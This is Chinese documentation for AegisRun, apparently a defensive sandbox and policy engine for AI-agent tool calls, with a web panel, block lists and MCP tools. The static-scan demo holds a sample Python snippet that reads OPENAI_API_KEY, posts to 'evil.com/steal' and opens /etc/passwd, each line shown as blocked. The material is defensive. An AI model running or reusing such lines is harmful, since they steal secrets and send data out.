
## 网页端使用教程

AegisRun 提供完整的 Web 管理面板，支持中英文界面切换、实时安全检测和 MCP Agent 交互调用。

### 启动服务器

```cmd
cd D:\moonbit\aegisrun\runtime
cargo run -- serve    # 或编译后: cargo build && target\debug\aegisrund.exe
```

浏览器打开 `http://localhost:9090` 即可访问管理面板。

### 界面布局

管理面板分为三大区域：

```
┌─────────────────────────────────────────────────────────────┐
│  Web 管理区                                                  │
│  ├─ 仪表盘: 防御层开关、实时统计、预设模板                    │
│  ├─ 域名策略: 黑名单/白名单管理                              │
│  ├─ 路径策略: 敏感路径拦截                                   │
│  ├─ 环境变量: 敏感变量模式                                   │
│  ├─ 工具管理: 工具ID封杀                                     │
│  └─ 审计日志: 实时操作记录                                   │
├─────────────────────────────────────────────────────────────┤
│  Sandbox 检测区                                              │
│  ├─ 静态扫描: 分析源码中的恶意模式                           │
│  └─ 运行时沙箱: Python audit hook 拦截实际操作               │
├─────────────────────────────────────────────────────────────┤
│  MCP Agent 区                                                │
│  ├─ MCP 端点配置说明                                         │
│  ├─ 可用工具列表（9个工具）                                  │
│  └─ 交互式调用面板: 选择工具 → 填写参数 → 查看结果          │
└─────────────────────────────────────────────────────────────┘
```

### 功能详解

#### 1. 中英文界面切换

右上角点击 **中文** / **EN** 按钮即可切换语言，所有界面元素（包括防御层名称、提示文本）都会实时更新。

#### 2. 防御层控制

仪表盘页面展示五层防御的实时状态，每层都有独立开关：

- **运行时沙箱** (Layer 1): Python audit hook 监控
- **域名黑名单** (Layer 2): 精确匹配 + 后缀通配 + IP前缀
- **路径+环境变量** (Layer 3): 精确匹配 + 前缀目录 + KEY/SECRET/TOKEN 检测
- **扫描器** (Layer 4): 静态代码分析
- **Wasm 沙箱** (Layer 5): wasmtime WASI 物理隔离

#### 3. 安全检测

切换到 **Sandbox** 标签页，提供两种检测模式：

**静态扫描** - 快速分析源码，识别恶意模式：
```python
import os
key = os.environ.get("OPENAI_API_KEY")  # L2 [env] OPENAI_API_KEY — BLOCKED
import requests
requests.post("https://evil.com/steal")  # L4 [host] evil.com — BLOCKED
open("/etc/passwd")                      # L5 [path] /etc/passwd — BLOCKED
```

**运行时沙箱** - 通过 Python audit hook 实际执行并拦截：
```python
# 同样的代码，运行时沙箱会拦截：
Static: 3 | Runtime: 1 | Blocked: 4
L2 [env] OPENAI_API_KEY — BLOCKED
L4 [host] evil.com — BLOCKED
L5 [path] /etc/passwd — BLOCKED
[runtime-env] OPENAI_API_KEY — BLOCKED
```

#### 4. MCP Agent 交互

切换到 **MCP Agent** 标签页：

1. **查看可用工具** - 自动加载 9 个 MCP 工具列表
2. **选择工具** - 从下拉菜单选择要调用的工具
3. **填写参数** - 根据工具要求填写 JSON 参数
4. **执行调用** - 点击 "调用" 按钮，查看实时结果

示例调用：
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "aegisrun.policy.check_domain",
    "arguments": {
      "domain": "evil.com"
    }
  }
}
```

返回结果：
```json
{
  "decision": "DENY",
  "reason": "blocked by network policy",
  "violations": [
    {"kind": "domain", "value": "evil.com"}
  ]
}
```

### 策略配置

Web 面板支持三种策略配置方式：

1. **预设模板** - 在仪表盘选择 Standard / Strict / Permissive
2. **手动管理** - 在各策略页面添加/删除域名、路径、环境变量
3. **实时同步** - 所有修改立即生效，无需重启

### API 接口

管理面板提供完整的 RESTful API：

- `GET /api/policy` - 获取当前策略
- `GET /api/stats` - 获取运行统计
- `GET /api/audit` - 获取审计日志
- `POST /api/scan` - 静态代码扫描
- `POST /api/sandbox-run` - 运行时沙箱检测
- `POST /mcp` - MCP 协议端点
# AegisRun v0.9.2

**AI Agent 安全工具执行框架 — MoonBit 策略引擎 + Rust 沙箱运行时**

> 🇬🇧 [English README →](docs-en/README.md)

[![MoonBit](https://img.shields.io/badge/MoonBit-0.1.20260608-blue)](https://moonbitlang.com)
[![Rust](https://img.shields.io/badge/Rust-wasmtime%2039-orange)](https://github.com/tuya-me/AegisRun/tree/clean-v2/runtime)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue)](https://opensource.org/licenses/Apache-2.0)
[![OSC2026](https://img.shields.io/badge/OSC2026-AI%20Agent%20Track-orange)](https://moonbitlang.github.io/OSC2026/)

> MoonBit `>= 0.1.20260608` | Rust `>= 1.80`（仅 runtime 目录需要）| wasmtime 39
> **安装：** `moon add tuya-me/aegisrun` &nbsp;|&nbsp; **分支：** `clean-v2`

---

## 项目简介

AI Agent 在运行中被第三方工具窃取 API Key、上传敏感文件、扫描内网——这不是假设，是已经发生的事。AegisRun 提供一个**轻量安全执行层**，在工具和系统之间做五层纵深防御。

- **MoonBit 层**（~3500 行）：域名/IP 黑名单、路径拦截、环境变量过滤、风险评分、限流熔断、SQL 防护
- **Rust 层**（~1000 行）：wasmtime WASI 物理隔离沙箱、Web 面板、审计日志、工具签名验证

## 两层架构

```
MoonBit 库 (src/lib/)               Rust 运行时 (runtime/)
┌────────────────────┐           ┌──────────────────────────────┐
│ check_domain()     │   Allow   │ wasmtime WASI 拦截器          │
│ check_path()       │←─────────│ path_open → check_path       │
│ check_env()        │   Deny    │ environ_get → check_env      │
│                    │           │ sock_send → check_domain    │
│ 纯逻辑，纯 MoonBit  │           │ 系统调用拦截，Rust 实现        │
└────────────────────┘           └──────────────────────────────┘
    策略判断层                         执行拦截层
```

### 五层防御

| 层 | 名称 | 实现 |
|:--:|------|------|
| 1 | 安装时声明审查 | 风险评分引擎 |
| 2 | 域名/IP 黑名单 | HashMap O(1) + 后缀通配 + IP 前缀（45+规则）|
| 3 | 路径 + 环境变量保护 | 精确 + 前缀 + KEY/SECRET/TOKEN 检测（60+模式）|
| 4 | 工具黑名单 + 审计 | 即时封杀 + JSONL 持久化 + 策略热加载 |
| 5 | Wasm 沙箱物理隔离 | Rust wasmtime WASI 零目录预打开 |

## 快速开始

```cmd
cd D:\moonbit\aegisrun
quickstart.cmd                    # 一键菜单

moon run src/main                 # 策略引擎演示

cd runtime
cargo run -- demo                 # Rust 策略引擎演示
cargo run -- serve                # Web 面板（9090端口）
```

## 文档导视

| 如果你... | 请阅读 |
|-----------|--------|
| **新手** — 想立刻跑起来 | [docs-ch/GUIDE.md](docs-ch/GUIDE.md)（新手入门） |
| **开发者** — 集成库 | [docs-ch/GUIDE.md](docs-ch/GUIDE.md)（详情参考） |
| **贡献者** — 提代码 | [docs-ch/CONTRIBUTING.md](docs-ch/CONTRIBUTING.md) |
| **安全工程师** — 审计规则 | [docs-ch/SECURITY-POLICY.md](docs-ch/SECURITY-POLICY.md) |
| **架构探索** — 理解设计 | [docs-ch/ARCHITECTURE.md](docs-ch/ARCHITECTURE.md) |
| **版本追踪** — 看更新 | [docs-ch/CHANGELOG.md](docs-ch/CHANGELOG.md) |
| **English speakers** | [docs-en/README.md](docs-en/README.md) |

### 文档树

```
README.md                        ← 本文（项目概览）
docs-ch/                          ← 中文文档（主版本）
├── GUIDE.md                      使用指南（新手级 + 详情级）
├── ARCHITECTURE.md               架构 + 调用链
├── CONTRIBUTING.md               贡献指南
├── CHANGELOG.md                  更新日志
├── SECURITY-POLICY.md            安全策略
└── DOCUMENTATION-GUIDE.md        文档规范
docs-en/                          ← 英文文档（辅助版本）
└── ...                           对应上述所有文档
```

## 命令速查

| 命令 | 效果 |
|------|------|
| `moon run src/main` | MoonBit 策略引擎 + 演示 |
| `cargo run -- demo` | Rust 策略引擎演示 |
| `cargo run -- scan malware.py` | 扫描脚本找威胁 |
| `cargo run -- sandbox tool.wasm` | WASI 物理隔离沙箱 |
| `cargo run -- serve` | Web 面板（9090端口）|
| `cargo run -- audit` | 审计日志 JSONL |
| `cargo run -- verify tool.wasm id pub` | 工具签名验证 |

### 库调用

```moonbit
// MoonBit：moon add tuya-me/aegisrun
let aegis = @lib.AegisRun::new("standard")
aegis.check_domain("evil.com")          // → Deny
```

```rust
// Rust：cargo add aegisrun-runtime
let policy = Policy::standard();
policy.check_domain("evil.com");  // → false
```

### MCP 集成

```json
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
```

9 个工具：policy.summary / policy.check_domain / policy.check_path / policy.check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm

## 开源许可

Apache License 2.0
